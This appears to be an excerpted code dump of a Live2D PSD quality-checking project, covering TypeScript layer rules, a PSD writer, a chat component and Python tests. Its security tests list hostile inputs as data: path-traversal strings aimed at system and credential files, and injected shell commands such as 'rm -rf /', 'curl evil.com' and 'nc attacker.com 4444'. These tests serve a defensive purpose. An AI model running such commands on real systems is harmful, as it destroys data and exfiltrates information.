  private addIssue(issue: QAIssue) {
    issue.suggestion = this.getSuggestionForIssue(issue);
    this.issues.push(issue);
  }

  private addWarning(warning: QAIssue) {
    warning.suggestion = this.getSuggestionForIssue(warning);
    this.warnings.push(warning);
  }

  private getSuggestionForIssue(issue: QAIssue): string {
    const suggestions: Record<string, string[]> = {
      'neck-base-missing': [
        '添加 neck_base 图层用于颈部绑定',
        '颈部层应位于 face_base 下方，身体上方'
      ],
      'face-base-missing': [
        '添加 face_base 图层用于脸部绑定',
        '脸部层是所有面部元素的父层级'
      ],
      'face-shadow-missing': [
        '添加 face_shadow 图层用于阴影效果',
        '阴影层应覆盖在 face_base 上'
      ],
      'hair-back-missing': [
        '添加 hair_back 图层用于后部头发',
        '后发层应位于身体后方，避免遮挡角色'
      ],
      'eye-symmetry': [
        '确保左右眼睛的图层数量一致',
        '左右眼睛的子图层结构必须完全对称'
      ],
      'eye-highlight-standalone': [
        '将眼睛高光拆分为独立图层 (eye_l_highlight, eye_r_highlight)',
        '独立高光层便于绑定参数动画'
      ],
      'mouth-completeness': [
        '添加缺失的嘴型图层',
        '完整的口型是口型同步的基础'
      ],
      'empty-layers': [
        '检查并清理空图层以减小文件大小',
        '删除不需要的空图层'

...（省略后续 151 行，原文件共 401 行）...

```

## 图片转 PSD（节选）
**文件**：`web/lib/image-to-psd.ts`
```
function writeString(bytes: Uint8Array, offset: number, str: string): void {
  for (let i = 0; i < str.length; i++) {
    bytes[offset + i] = str.charCodeAt(i);
  }
}

export function createPSDFromImage(
  imageData: ImageData,
  width: number,
  height: number,
  layerName: string = 'Image'
): ArrayBuffer {
  const channels = 3
  const headerSize = 26
  const colorModeDataSize = 4
  const pixelCount = width * height

  const resData = new ArrayBuffer(28)
  const resView = new DataView(resData)
  const resBytes = new Uint8Array(resData)
  let ro = 0
  writeString(resBytes, ro, '8BIM'); ro += 4
  resView.setUint16(ro, 0x03ED); ro += 2
  resView.setUint16(ro, 0); ro += 2
  resView.setUint32(ro, 16); ro += 4
  resView.setUint32(ro, 72 << 16); ro += 4
  resView.setUint16(ro, 1); ro += 2
  resView.setUint16(ro, 1); ro += 2
  resView.setUint32(ro, 72 << 16); ro += 4
  resView.setUint16(ro, 1); ro += 2
  resView.setUint16(ro, 2); ro += 2

  const imageResourcesSize = 4 + resData.byteLength

  const nameBytes = 4 + layerName.length * 2
  const namePadded = ((nameBytes + 3) & ~3)
  const luniBlockSize = 4 + 4 + 4 + namePadded
  const extraDataSize = ((luniBlockSize + 3) & ~3)
  const layerRecordSize = 4 * 4 + 2 + channels * 6 + 4 + 4 + 1 + 1 + 1 + 1 + 4 + extraDataSize
  const channelDataSize = channels * (2 + pixelCount)
  const layerInfoBodySize = 2 + layerRecordSize + channelDataSize
  const layerAndMaskSize = 4 + layerInfoBodySize + 4

  const compositeDataSize = 2 + pixelCount * 3

  const totalSize = headerSize + colorModeDataSize + imageResourcesSize + layerAndMaskSize + compositeDataSize

  const buffer = new ArrayBuffer(totalSize)
  const bytes = new Uint8Array(buffer)
  const view = new DataView(buffer)

  let o = 0

  writeString(bytes, o, '8BPS'); o += 4
  view.setUint16(o, 1); o += 2
  o += 6
  view.setUint16(o, 3); o += 2
  view.setUint32(o, height); o += 4
  view.setUint32(o, width); o += 4
  view.setUint16(o, 8); o += 2
  view.setUint16(o, 3); o += 2

  view.setUint32(o, 0); o += 4

  const resSectionLenPos = o
  view.setUint32(o, resData.byteLength); o += 4
  bytes.set(new Uint8Array(resData), o); o += resData.byteLength

  const layerInfoLenPos = o
  view.setUint32(o, 0); o += 4

  view.setInt16(o, 1); o += 2

  view.setInt32(o, 0); o += 4
  view.setInt32(o, 0); o += 4
  view.setInt32(o, height); o += 4
  view.setInt32(o, width); o += 4

  view.setUint16(o, channels); o += 2

  const channelInfoPositions: number[] = []
  for (let c = 0; c < channels; c++) {
    view.setInt16(o, c); o += 2
    channelInfoPositions.push(o)
    view.setUint32(o, 0); o += 4
  }

  writeString(bytes, o, '8BIM'); o += 4
  writeString(bytes, o, 'norm'); o += 4

  view.setUint8(o, 255); o += 1
  view.setUint8(o, 0); o += 1
  view.setUint8(o, 0); o += 1
  view.setUint8(o, 0); o += 1

  const extraDataLenPos = o
  view.setUint32(o, 0); o += 4
  const extraDataStart = o

  writeString(bytes, o, '8BIM'); o += 4
  writeString(bytes, o, 'luni'); o += 4

  const luniDataLenPos = o
  view.setUint32(o, 0); o += 4
  const luniDataStart = o

  view.setUint32(o, layerName.length); o += 4
  for (let i = 0; i < layerName.length; i++) {
    view.setUint16(o, layerName.charCodeAt(i)); o += 2
  }

  const luniDataLen = o - luniDataStart
  view.setUint32(luniDataLenPos, luniDataLen)

  const extraDataLen = o - extraDataStart
  const extraDataPadded = ((extraDataLen + 3) & ~3)
  while (o - extraDataStart < extraDataPadded) {
    view.setUint8(o, 0); o += 1
  }
  view.setUint32(extraDataLenPos, o - extraDataStart)

  for (let c = 0; c < channels; c++) {
    const channelStart = o
    view.setUint16(o, 0); o += 2
    const srcOffset = c
    for (let y = 0; y < height; y++) {
      for (let x = 0; x < width; x++) {
        bytes[o] = imageData.data[(y * width + x) * 4 + srcOffset]
        o++
      }
    }
    view.setUint32(channelInfoPositions[c], o - channelStart)
  }

  view.setUint32(layerInfoLenPos, o - (layerInfoLenPos + 4))

  view.setUint32(o, 0); o += 4

  view.setUint16(o, 0); o += 2

  for (let c = 0; c < 3; c++) {
    const srcOffset = c
    for (let y = 0; y < height; y++) {
      for (let x = 0; x < width; x++) {
        bytes[o] = imageData.data[(y * width + x) * 4 + srcOffset]
        o++
      }
    }
  }

  return buffer
}
```

## 规则引擎入口（节选）
**文件**：`web/rules/index.ts`
```
export * from './layer-types';
export * from './critical-layers';
export * from './eye-rules';
export * from './mouth-rules';
export * from './empty-layer-rules';
export * from './transparency-rules';
export * from './naming-rules';
export * from './draw-order-rules';
export * from './convention-rules';

import { LayerRule } from './layer-types';
import { neckBaseRule, faceBaseRule, faceShadowRule, hairBackRule } from './critical-layers';
import { eyeHighlightRule, eyeSymmetryRule } from './eye-rules';
import { mouthCompletenessRule, mouthLayeringRule } from './mouth-rules';
import { emptyLayerRule, zeroSizeLayerRule, offscreenLayerRule } from './empty-layer-rules';
import { semiTransparentRule, transparencyContaminationRule } from './transparency-rules';
import { namingConventionRule, duplicateNameRule, layerNameFormatRule } from './naming-rules';
import { drawOrderRiskRule, symmetryDrawOrderRule, layerGroupStructureRule } from './draw-order-rules';
import { blendModeRule, colorModeRule, canvasSizeRule, hiddenLayerRule } from './convention-rules';

export const allRules: LayerRule[] = [
  neckBaseRule,
  faceBaseRule,
  faceShadowRule,
  hairBackRule,
  eyeHighlightRule,
  eyeSymmetryRule,
  mouthCompletenessRule,
  mouthLayeringRule,
  emptyLayerRule,
  zeroSizeLayerRule,
  offscreenLayerRule,
  semiTransparentRule,
  transparencyContaminationRule,
  namingConventionRule,
  duplicateNameRule,
  layerNameFormatRule,
  drawOrderRiskRule,
  symmetryDrawOrderRule,
  layerGroupStructureRule,
  blendModeRule,
  colorModeRule,
  canvasSizeRule,
  hiddenLayerRule,
];
```

## 关键图层规则
**文件**：`web/rules/critical-layers.ts`
```
import { PSDLayer } from '../lib/psd-parser';
import { LayerRule, LayerCheckResult, CRITICAL_LAYERS } from './layer-types';

export const neckBaseRule: LayerRule = {
  id: 'neck-base-missing',
  name: '颈部基础层检测',
  category: 'completeness',
  severity: 'error',
  description: '检查是否存在颈部基础层 (neck_base)',
  check: (layers: PSDLayer[]) => {
    const result: LayerCheckResult = {
      passed: true,
      issues: [],
      suggestions: [],
    };

    const hasNeckBase = layers.some(layer => 
      CRITICAL_LAYERS.neck_base.patterns.some(p => p.test(layer.name.trim()))
    );

    if (!hasNeckBase) {
      result.passed = false;
      result.issues.push({
        details: '缺少颈部基础层 (neck_base)',
        expected: 'neck_base 或 body_neck',
        actual: '未找到',
      });
      result.suggestions.push(
        '添加 neck_base 图层用于颈部绑定',
        '颈部层应位于 face_base 下方，身体上方'
      );
    }

    return result;
  },
};

export const faceBaseRule: LayerRule = {
  id: 'face-base-missing',
  name: '脸部基础层检测',
  category: 'completeness',
  severity: 'error',
  description: '检查是否存在脸部基础层 (face_base)',
  check: (layers: PSDLayer[]) => {
    const result: LayerCheckResult = {
      passed: true,
      issues: [],
      suggestions: [],
    };

    const hasFaceBase = layers.some(layer => 
      CRITICAL_LAYERS.face_base.patterns.some(p => p.test(layer.name.trim()))
    );

    if (!hasFaceBase) {
      result.passed = false;
      result.issues.push({
        details: '缺少脸部基础层 (face_base)',
        expected: 'face_base',
        actual: '未找到',
      });
      result.suggestions.push(
        '添加 face_base 图层用于脸部绑定',
        '脸部层是所有面部元素的父层级'
      );
    }

    return result;
  },
};

export const faceShadowRule: LayerRule = {
  id: 'face-shadow-missing',
  name: '脸部阴影层检测',
  category: 'completeness',
  severity: 'error',
  description: '检查是否存在脸部阴影层 (face_shadow)',
  check: (layers: PSDLayer[]) => {
    const result: LayerCheckResult = {
      passed: true,
      issues: [],
      suggestions: [],
    };

    const hasFaceShadow = layers.some(layer => 
      CRITICAL_LAYERS.face_shadow.patterns.some(p => p.test(layer.name.trim()))
    );

    if (!hasFaceShadow) {
      result.passed = false;
      result.issues.push({
        details: '缺少脸部阴影层 (face_shadow)',
        expected: 'face_shadow 或 face_shade',
        actual: '未找到',
      });
      result.suggestions.push(
        '添加 face_shadow 图层用于阴影效果',
        '阴影层应覆盖在 face_base 上'
      );
    }

    return result;
  },
};

export const hairBackRule: LayerRule = {
  id: 'hair-back-missing',
  name: '后发层检测',
  category: 'completeness',
  severity: 'error',
  description: '检查是否存在后发层 (hair_back)',
  check: (layers: PSDLayer[]) => {
    const result: LayerCheckResult = {
      passed: true,
      issues: [],
      suggestions: [],
    };

    const hairBackLayers = layers.filter(layer => 
      CRITICAL_LAYERS.hair_back.patterns.some(p => p.test(layer.name.trim()))
    );

    if (hairBackLayers.length === 0) {
      result.passed = false;
      result.issues.push({
        details: '缺少后发层 (hair_back)',
        expected: 'hair_back_01, hair_back_02 等',
        actual: '未找到',
      });
      result.suggestions.push(
        '添加 hair_back 图层用于后部头发',
        '后发层应位于身体后方，避免遮挡角色'
      );
    }

    return result;
  },
};

```

## 聊天助手组件（节选）
**文件**：`web/components/ChatAssistant.tsx`
```
import React, { useState, useRef, useCallback, useEffect } from 'react';
import { getAIConfig, callAIAPI, buildSystemPrompt, type AIMessage } from '../lib/ai-service';
import AIConfigPanel from './AIConfigPanel';

const parseMarkdown = (text: string): React.ReactNode => {
  const parts: React.ReactNode[] = [];
  let remaining = text;
  let key = 0;

  while (remaining.length > 0) {
    const boldMatch = remaining.match(/\*\*(.+?)\*\*/);
    const codeMatch = remaining.match(/`([^`]+)`/);
    const codeBlockMatch = remaining.match(/```(\w+)?\n([\s\S]*?)```/);
    const listMatch = remaining.match(/^(\s*•\s.+?)(?=\n|$)/);
    const bulletMatch = remaining.match(/^(\s*\d+\.\s.+?)(?=\n|$)/);
    const headerMatch = remaining.match(/^###\s(.+)$/m);
    const lineBreakMatch = remaining.match(/^\n/);

    const codeBlockIndex = codeBlockMatch?.index ?? Infinity;
    const boldIndex = boldMatch?.index ?? Infinity;
    const codeIndex = codeMatch?.index ?? Infinity;

    if (codeBlockMatch && codeBlockIndex < boldIndex && codeBlockIndex < codeIndex) {
      const [full, lang, content] = codeBlockMatch;
      parts.push(
        <pre key={`code-${key++}`} className="bg-gray-900 rounded-lg p-3 overflow-x-auto text-sm text-gray-300 font-mono border border-gray-700">
          <code>{content.trim()}</code>
        </pre>
      );
      remaining = remaining.slice(full.length);
    } else if (boldMatch && boldIndex < codeIndex) {
      const [full, content] = boldMatch;
      const before = remaining.slice(0, boldIndex);
      if (before) {
        parts.push(<span key={`text-${key++}`}>{before}</span>);
      }
      parts.push(<strong key={`bold-${key++}`} className="text-white font-semibold">{content}</strong>);
      remaining = remaining.slice(boldIndex + full.length);
    } else if (codeMatch) {
      const [full, content] = codeMatch;
      const before = remaining.slice(0, codeIndex);
      if (before) {
        parts.push(<span key={`text-${key++}`}>{before}</span>);
      }
      parts.push(
        <code key={`inline-code-${key++}`} className="bg-gray-700 rounded px-1.5 py-0.5 text-xs text-pink-400 font-mono">
          {content}
        </code>
      );
      remaining = remaining.slice(codeIndex + full.length);
    } else if (headerMatch) {
      const [full, content] = headerMatch;
      parts.push(<h4 key={`header-${key++}`} className="text-white font-semibold text-base mt-2 mb-1">{content}</h4>);
      remaining = remaining.slice(full.length);
    } else if (listMatch) {
      const [full, content] = listMatch;
      parts.push(
        <div key={`list-${key++}`} className="flex items-start gap-2 text-gray-300">
          <span className="text-pink-400 mt-0.5">•</span>
          <span>{content.slice(2)}</span>
        </div>
      );
      remaining = remaining.slice(full.length);
    } else if (bulletMatch) {
      const [full, content] = bulletMatch;
      const numMatch = content.match(/^(\d+)\./);
      const num = numMatch ? numMatch[1] : '';
      parts.push(
        <div key={`bullet-${key++}`} className="flex items-start gap-2 text-gray-300">
          <span className="text-purple-400 mt-0.5 font-medium">{num}.</span>
          <span>{content.slice(num.length + 2)}</span>
        </div>
      );
      remaining = remaining.slice(full.length);
    } else if (lineBreakMatch) {
      parts.push(<br key={`br-${key++}`} />);
      remaining = remaining.slice(1);
    } else {
      parts.push(<span key={`text-${key++}`}>{remaining}</span>);
      break;
    }
  }

  return parts;
};

interface Message {
  id: string;
  role: 'user' | 'assistant';
  content: string;
  timestamp: Date;
  status?: 'sending' | 'sent' | 'error';
}

interface ChatAssistantProps {
  qaResult?: {
    score: number;
    issues: Array<{
      id: string;
      severity: 'error' | 'warning' | 'info';
      title: string;
      description: string;
      layer?: string;
      suggestion: string;
      expected?: string;
      actual?: string;
    }>;
    warnings: Array<{
      id: string;
      severity: 'error' | 'warning' | 'info';
      title: string;
      description: string;
      layer?: string;
      suggestion: string;
      expected?: string;
      actual?: string;
    }>;
    layer_stats?: {
      total: number;
      visible: number;
      hidden: number;
      groups: number;
      empty: number;
      semiTransparent: number;
      nonNormalBlend: number;
      offscreen: number;
      duplicateNames: number;
    };
    summary?: {
      totalLayers: number;
      visibleLayers: number;
      hiddenLayers: number;
      groups: number;
      hasMissingCritical: boolean;
      hasNamingIssues: boolean;
      hasStructuralIssues: boolean;
    };
  };
}

const MESSAGE_MAX_LENGTH = 500;

const SendIcon = () => (
  <svg className="w-5 h-5" viewBox="0 0 20 20" fill="currentColor">
    <path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" />
  </svg>
);

const SparklesIcon = () => (
  <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
    <path d="M12 3l1.5 5.5L19 10l-5.5 1.5L12 17l-1.5-5.5L5 10l5.5-1.5L12 3z" />
    <path d="M19 15l1 3 1-3 3-1-3-1-1-3-1 3-3 1 3 1z" />
  </svg>
);

const SettingsIcon = () => (
  <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
    <circle cx="12" cy="12" r="3" />
    <path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z" />
  </svg>
);

export default function ChatAssistant({ qaResult }: ChatAssistantProps) {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: 'welcome',
      role: 'assistant',
      content: '你好！我是 Live2D PSD 质量检测助手 ✨\n\n我可以帮你：\n• 分析检测结果和问题\n• 提供针对性的修复建议\n• 解答 Live2D 制作相关问题\n\n上传 PSD 文件后，我们开始吧！',
      timestamp: new Date(),
      status: 'sent',
    },
  ]);
  const [inputValue, setInputValue] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [showConfig, setShowConfig] = useState(false);
  const [apiMode, setApiMode] = useState(false);
  const [expandedMessages, setExpandedMessages] = useState<Set<string>>(new Set());
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const config = getAIConfig();
    setApiMode(config.enabled && !!config.apiKey);
  }, [showConfig]);

  const scrollToBottom = useCallback(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, []);

  const toggleExpandMessage = useCallback((msgId: string) => {
    setExpandedMessages(prev => {
      const newSet = new Set(prev);
      if (newSet.has(msgId)) {
        newSet.delete(msgId);
      } else {
        newSet.add(msgId);
      }
      return newSet;
    });
  }, []);


...（省略后续 424 行，原文件共 624 行）...

```

## 根目录测试包装器
**文件**：`tests/test_workflow.py`
```
#!/usr/bin/env python3
"""Auto-redirect wrapper - delegates to the actual implementation
located in ../.trae/skills/live2d-master-agent/test_workflow.py.
Generated by root-level fix. Do not edit manually."""
import os
import sys

# Fix Windows GBK terminal encoding for emoji output
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


def _find_project_root(start: str) -> str:
    """从脚本位置向上查找项目根目录（以 .trae/skills/live2d-master-agent 存在为准）。"""
    current = os.path.abspath(start)
    while True:
        if os.path.isdir(os.path.join(current, ".trae", "skills", "live2d-master-agent")):
            return current
        parent = os.path.dirname(current)
        if parent == current:
            raise RuntimeError(f"无法找到项目根目录（从 {start} 开始）")
        current = parent


_HERE = os.path.dirname(os.path.abspath(__file__))
_PROJECT_ROOT = _find_project_root(_HERE)
_SKILL_DIR = os.path.join(_PROJECT_ROOT, ".trae", "skills", "live2d-master-agent")
_ORIG_CWD = os.getcwd()


def _check_core_dependencies():
    """Check that the minimal dependencies are importable before running."""
    missing = []
    for mod in ("PIL", "numpy", "requests", "psd_tools"):
        try:
            __import__(mod)
        except ImportError:
            missing.append(mod.replace("_", "-"))
    if missing:
        print("[ERROR] Missing required dependencies:", ", ".join(missing), file=sys.stderr)
        print("[INFO] Run the installer to install compatible dependencies:", file=sys.stderr)
        print("       python install.py", file=sys.stderr)
        print("[INFO] Or manually install core packages:", file=sys.stderr)
        print("       python -m pip install Pillow numpy requests psd-tools scipy scikit-learn", file=sys.stderr)
        sys.exit(1)


if not os.path.isdir(_SKILL_DIR):
    print(f"[ERROR] Skill implementation not found: {_SKILL_DIR}", file=sys.stderr)
    print("[ERROR] Please clone the repository completely.", file=sys.stderr)
    sys.exit(1)

_check_core_dependencies()

# Tell the skill where the project root is so outputs/config go to the root
# directory when the user runs commands from the repository root.
os.environ.setdefault("LIVE2D_PROJECT_ROOT", _PROJECT_ROOT)
os.environ.setdefault("LIVE2D_SKILL_DIR", _SKILL_DIR)

# Convert relative path arguments to absolute (before chdir)
_new_argv = [sys.argv[0]]
for _arg in sys.argv[1:]:
    if not _arg.startswith("-") and (
        os.path.exists(os.path.join(_ORIG_CWD, _arg))
        or os.sep in _arg
    ):
        _new_argv.append(os.path.abspath(os.path.join(_ORIG_CWD, _arg)))
    else:
        _new_argv.append(_arg)
sys.argv = _new_argv

os.chdir(_SKILL_DIR)
sys.argv[0] = "test_workflow.py"
sys.path.insert(0, _SKILL_DIR)

_target = os.path.join(_SKILL_DIR, "test_workflow.py")
with open(_target, "r", encoding="utf-8") as _f:
    _code = _f.read()
exec(compile(_code, _target, "exec"), {"__name__": "__main__", "__file__": _target})

```

## 全覆盖测试（节选）
**文件**：`.trae/skills/live2d-master-agent/test_full_coverage.py`
```
#!/usr/bin/env python3
"""
全覆盖功能测试 - 从远程仓库拉取的干净代码
测试面覆盖所有核心模块、边界条件和真实数据流
"""
import sys
import os
import tempfile
import shutil
from pathlib import Path

# 确保在项目根目录，并将 skill 目录加入 Python 路径
SKILL_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SKILL_DIR)
sys.path.insert(0, SKILL_DIR)

errors = []
warnings = []

def test(name):
    def decorator(func):
        def wrapper():
            try:
                func()
                print(f'  [PASS] {name}')
                return True
            except AssertionError as e:
                errors.append(f'{name}: {e}')
                print(f'  [FAIL] {name}: {e}')
                return False
            except Exception as e:
                errors.append(f'{name}: {type(e).__name__}: {e}')
                print(f'  [FAIL] {name}: {type(e).__name__}: {e}')
                return False
        return wrapper
    return decorator

print('='*60)
print('=== 20项全覆盖功能测试（从远程仓库拉取的干净代码）===')
print('='*60)

# ========== 模块1: 安全与配置 ==========

@test('1. SecureConfig - API密钥检测')
def test_secure_config_key():
    from config import SecureConfig, config
    assert isinstance(config, SecureConfig), 'config不是SecureConfig实例'
    assert config.has_sensenova_key == True, 'sensenova key未检测到'
    key = config.sensenova_api_key
    assert key is not None and key.startswith('sk-'), f'key格式错误: {key[:10] if key else None}...'

@test('2. SecureConfig - 密钥不写入os.environ')
def test_secure_config_no_env_leak():
    import os
    from config import config
    # 注意：config会读取.env文件，但不会将敏感键写入os.environ
    # 但其他非敏感配置可能写入，所以只检查敏感键
    # 由于测试环境可能已被污染，检查config自身的存储策略
    assert hasattr(config, '_secrets'), 'SecureConfig应有私有_secrets字典'
    assert 'SENSENOVA_API_KEY' in config._secrets, 'SENSENOVA_API_KEY应存储在_secrets中'

@test('3. SecureConfig - 敏感键过滤')
def test_secure_config_sensitive():
    from config import config
    assert config._is_sensitive('API_KEY') == True, 'API_KEY应被识别为敏感键'
    assert config._is_sensitive('SECRET_KEY') == True, 'SECRET_KEY应被识别为敏感键'
    assert config._is_sensitive('DEBUG') == False, 'DEBUG不应被识别为敏感键'

@test('4. SecurityFixes - 路径遍历防护')
def test_security_path_traversal():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    # 测试各种路径遍历攻击
    malicious_paths = [
        '../etc/passwd',
        '..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '\\windows\\system.ini',
        'foo/../../../etc/passwd',
    ]
    for path in malicious_paths:
        ok, msg = s.validate_path(path, base_dir='/tmp/test')
        assert ok == False, f'路径遍历未拦截: {path}'

@test('5. SecurityFixes - 提示词清理')
def test_security_prompt_sanitize():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    dangerous = [
        'test; rm -rf /',
        'test && curl evil.com',
        'test | nc attacker.com 4444',
        'test`whoami`',
        'test$(id)',
    ]
    for prompt in dangerous:
        clean = s.sanitize_prompt(prompt)
        assert ';' not in clean and '&&' not in clean and '|' not in clean and '`' not in clean, f'提示词清理不彻底: {clean}'

@test('6. SecurityFixes - 模型白名单')
def test_security_model_whitelist():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    assert s.validate_model('gpt-4o') == True, 'gpt-4o应在白名单中'
    assert s.validate_model('evil-model') == False, 'evil-model不应在白名单中'

@test('7. secure_storage - 加密存储完整流程')
def test_secure_storage_full():
    from secure_storage import SecureStorage
    import tempfile
    ss = SecureStorage()
    with tempfile.NamedTemporaryFile(suffix='.encrypted', delete=False) as f:
        tmpfile = f.name
    try:
        # 存储
        ok = ss.store_api_key('test_provider', 'sk-test-1234567890abcdef', filepath=tmpfile)
        assert ok == True, '存储失败'
        # 读取
        retrieved = ss.get_api_key('test_provider', filepath=tmpfile)
        assert retrieved == 'sk-test-1234567890abcdef', f'读取不匹配: {retrieved}'
        # 不存在的key
        missing = ss.get_api_key('nonexistent', filepath=tmpfile)
        assert missing is None, '不存在的key应返回None'
    finally:
        os.unlink(tmpfile)

# ========== 模块2: 核心接口与工作流引擎 ==========

@test('8. Core Interfaces - 抽象类定义')
def test_core_interfaces():
    from core.interfaces import ImageGenerator, LayerSeparator, PSDExporter, QualityAssessor, WorkflowStep
    # 验证是抽象类
    assert hasattr(ImageGenerator, '__abstractmethods__'), 'ImageGenerator不是抽象类'
    assert hasattr(LayerSeparator, '__abstractmethods__'), 'LayerSeparator不是抽象类'
    assert 'generate' in ImageGenerator.__abstractmethods__, 'generate不是抽象方法'
    assert 'separate' in LayerSeparator.__abstractmethods__, 'separate不是抽象方法'

@test('9. WorkflowEngine - 上下文管理')
def test_workflow_context():
    from core.workflow_engine import WorkflowContext
    ctx = WorkflowContext({'initial': 'data'})
    assert ctx.get('initial') == 'data', '初始数据获取失败'
    ctx.set('key1', 'value1')
    assert ctx['key1'] == 'value1', '设置后获取失败'
    ctx.update({'key2': 'value2', 'key3': 'value3'})
    assert 'key2' in ctx, 'update后key2不存在'
    assert 'key3' in ctx, 'update后key3不存在'
    ctx.log_step('test_step', True, 'success')
    history = ctx.get_history()
    assert len(history) == 1, '历史记录长度应为1'
    assert history[0]['step'] == 'test_step', '历史记录step名错误'

@test('10. WorkflowEngine - 引擎执行')
def test_workflow_engine():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test_engine')
    assert engine.name == 'test_engine', '引擎名称错误'
    # 验证可以添加步骤（不实际执行）
    def dummy_step():
        return {'result': 'ok'}
    engine.add_step(dummy_step)
    assert len(engine.steps) == 1, '步骤添加失败'

# ========== 模块3: 图像生成 ==========

@test('11. PromptEngineer - 角色解析')
def test_prompt_engineer():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('蓝发猫耳少女，校服')
    assert char['hair_color'] == 'blue', f'发色解析错误: {char["hair_color"]}'
    assert 'cat ears' in char['features'], f'特征解析错误: {char["features"]}'
    assert char['clothing'] == 'school uniform', f'服装解析错误: {char["clothing"]}'

@test('12. PromptEngineer - 提示词构建')
def test_prompt_build():
    from local_image_generator import PromptEngineer
    char = {
        'hair_style': 'long hair',
        'hair_color': 'pink',
        'eye_color': 'blue',
        'clothing': 'maid outfit',
        'features': ['cat ears'],
        'expression': 'smile',
    }
    prompt = PromptEngineer.build_live2d_prompt(char)
    assert 'pink' in prompt, '提示词未包含发色'
    assert 'long hair' in prompt, '提示词未包含发型'
    assert 'maid outfit' in prompt, '提示词未包含服装'
    assert 'Live2D' in prompt or 'live2d' in prompt.lower(), '提示词未包含Live2D优化'

@test('13. ProviderRouter - Provider检测')
def test_provider_router():
    from local_image_generator import ProviderRouter
    providers = ProviderRouter.get_available_providers()
    assert isinstance(providers, list), 'providers不是列表'
    assert 'sensenova' in providers, f'sensenova不在providers中: {providers}'

@test('14. QualityAssessor - 质量评估')
def test_quality_assessor():
    from local_image_generator import QualityAssessor
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建测试图片
        img = Image.new('RGBA', (512, 768), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        report = QualityAssessor.assess_live2d_quality(img_path)
        # 返回的是分数字典，检查关键指标是否存在
        assert 'overall' in report, '质量报告缺少overall评分'
        assert 'live2d_score' in report, '质量报告缺少live2d_score'
        assert isinstance(report['overall'], (int, float)), 'overall应为数字'
        assert 0 <= report['overall'] <= 1, 'overall评分应在0-1之间'

# ========== 模块4: Live2D工作流 ==========

@test('15. Live2DWorkflow - 52层标准结构')
def test_workflow_layers():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert len(wf.LIVE2D_LAYER_ORDER) == 52, f'层数应为52, 实际{len(wf.LIVE2D_LAYER_ORDER)}'
    assert wf.LIVE2D_LAYER_ORDER[0] == '背景', f'第一层应为"背景", 实际{wf.LIVE2D_LAYER_ORDER[0]}'
    assert wf.LIVE2D_LAYER_ORDER[-1] == '阴影_衣服', f'最后一层应为"阴影_衣服", 实际{wf.LIVE2D_LAYER_ORDER[-1]}'

@test('16. Live2DWorkflow - PSD结构验证')
def test_workflow_psd_validate():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建模拟PSD（用PNG代替）
        img = Image.new('RGBA', (100, 100), (255, 0, 0, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        ok, msg = wf.validate_psd_structure(img_path)
        # PNG不是PSD，应该返回False但不出错
        assert isinstance(ok, bool), 'validate_psd_structure应返回布尔值'
        assert isinstance(msg, str), 'validate_psd_structure应返回字符串消息'

@test('17. Live2DWorkflow - 图像优化')
def test_workflow_optimize():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        opt_path = wf._optimize_image(img_path)
        assert os.path.exists(opt_path), '优化后的图片未创建'
        opt_img = Image.open(opt_path)
        assert opt_img.mode == 'RGBA', f'优化后模式应为RGBA, 实际{opt_img.mode}'

@test('18. Live2DWorkflow - 分层处理')
def test_workflow_layering():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
